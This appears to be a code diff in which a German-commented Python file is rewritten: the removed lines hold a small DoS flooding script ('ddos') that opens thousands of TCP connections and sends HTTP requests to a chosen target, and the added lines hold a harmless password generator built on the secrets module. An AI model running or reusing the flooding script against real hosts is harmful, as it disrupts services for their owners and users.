@@ -1,23 +1,32 @@
-import socket
+# Passwort Generator in Python
+# Made by github.com/chatopex
+# Version 1.0.1 I Python 3.9
 
-def ddos(target, port, requests):
-    for i in range(0, requests, 100):
-        client_list = []
-        for j in range(1000):
-            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            client.connect((target, port))
-            client.sendall("GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(target).encode("utf-8"))
-            client_list.append(client)
-        for client in client_list:
-            client.close()
+import string
+import secrets
 
-print("Die Anfragen werden gesendet...")
+print("Password Gen 1.0.1 by github.com/chatopex")
+print("                        ")
 
-if __name__ == "__main__":
-    target = "chatopex.de" # Es kann jede IP eingegeben werden
-    port = 80
-    requests = 10000
+def passwort_generator(anzahl_passwoerter, laenge, sonderzeichen):
+    passwoerter = []
+    zeichen = ""
+    if sonderzeichen:
+        zeichen = string.ascii_letters + string.digits + string.punctuation
+    else:
+        zeichen = string.ascii_letters + string.digits
+    for _ in range(anzahl_passwoerter):
+        passwort = ''.join(secrets.choice(zeichen) for _ in range(laenge))
+        passwoerter.append(passwort)
+    return passwoerter
 
-    ddos(target, port, requests)
+# Benutzereingaben abfragen
+anzahl_passwoerter = int(input("Wie viele Passwörter möchten Sie generieren: "))
+laenge = int(input("Wie lang sollen die Passwörter sein: "))
+sonderzeichen = input("Möchten Sie Sonderzeichen in den Passwörtern verwenden? (ja/nein) ")
+sonderzeichen = sonderzeichen.lower()
 
-print("Anzahl der erledigten Requests:", requests)
+# Passwörter generieren und ausgeben
+passwoerter_liste = passwort_generator(anzahl_passwoerter, laenge, sonderzeichen == "ja")
+for pw in passwoerter_liste:
+    print(pw)
